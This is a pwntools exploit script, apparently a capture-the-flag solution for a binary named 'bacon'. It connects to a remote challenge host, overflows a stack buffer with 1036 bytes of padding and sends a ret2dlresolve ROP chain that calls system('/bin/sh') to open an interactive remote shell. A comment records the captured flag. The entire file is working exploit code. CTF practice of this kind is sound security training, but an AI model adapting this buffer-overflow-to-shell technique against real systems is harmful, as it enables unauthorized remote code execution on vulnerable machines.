from pwn import *

elf = ELF("bacon")
rop = ROP([elf.path])
HOST = "jh2i.com"
PORT = 50032
p = remote(HOST, PORT)

dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

log.info(rop.dump())

payload = b"A" * 1036
payload += raw_rop
payload += dlresolve.payload

p.send(payload)
p.interactive()

# FLAG --> flag{don't_forget_to_take_out_the_grease}
